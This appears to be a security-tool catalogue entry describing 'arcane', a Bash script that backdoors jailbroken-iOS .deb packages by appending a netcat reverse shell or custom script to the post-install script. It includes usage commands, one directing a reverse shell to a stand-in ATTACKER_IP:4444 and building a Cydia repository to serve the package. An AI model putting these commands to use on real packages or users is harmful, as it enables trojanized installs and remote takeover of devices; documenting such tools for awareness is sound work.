---
name: "arcane"
categories:
  - blackarch-mobile
version: "2.750cb9f"
homepage: "https://github.com/tokyoneon/Arcane"
packaged-by: [blackarch]
blackarch-builddate: "2026-02-03"
build-system: scripts
license: custom:unknown
meta-checked: "2026-11-09"
github-repo: "tokyoneon/Arcane"
github-stars: 159
github-pushed: "2020-08-04"
github-archived: false
github-issues: 0
github-match: "exact"
gh-checked: "2026-11-07"
worth: 2.5
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# arcane

> Backdoor iOS Debian/Cydia packages by appending attacker commands to the package's post-install script.

## What it's for

arcane is a Bash script that trojanizes `.deb` packages built for jailbroken iPhones (iphoneos-arm). Given an input package — the `samples/` directory ships several pulled verbatim from a real Cydia repository — it decompresses the package, appends either a netcat reverse shell or an arbitrary attacker script to the `DEBIAN/postinst` maintainer script, renames the package so it is easy to spot in Cydia, rebuilds it, and can generate the directory resources for an APT/Cydia repository to host the result. It was written to accompany a Null Byte article on why third-party Cydia repositories are dangerous: nothing is exploited, and the payload only runs — with the installer's privileges — once a user installs the trojanized package. The `--udp` option exists but is disabled in the source.

## Typical use cases

### Backdoor an iOS package with a reverse shell

Embed a netcat callback into a package and build the Cydia repository structure around it.

```
./arcane.sh --input samples/whois_5.3.2-1_iphoneos-arm.deb --lhost ATTACKER_IP --lport 4444 --netcat --cydia
```

Outcome: a renamed, backdoored `.deb` whose `postinst` script spawns a netcat reverse shell to `ATTACKER_IP:4444` on installation, plus the APT/Cydia repository resources needed to serve it; `--input` and `--lhost` are required.

### Embed a custom script instead of the stock payload

Supply your own shell script as the payload rather than the built-in netcat command.

```
./arcane.sh --input package.deb --file payload.sh
```

Outcome: the contents of `payload.sh` are appended verbatim to the package's `DEBIAN/postinst` (made executable), running once at install time.

### Inspect a package that arcane produced

Verify exactly what was injected before shipping the package.

```
dpkg-deb -R backdoored.deb /tmp/pkg-decomp
cat /tmp/pkg-decomp/DEBIAN/postinst
```

Outcome: the package is unpacked to `/tmp/pkg-decomp`, exposing `DEBIAN/control` and `DEBIAN/postinst`; the appended backdoor lines sit at the end of `postinst`.

*No corpus evidence — derived from upstream documentation.*
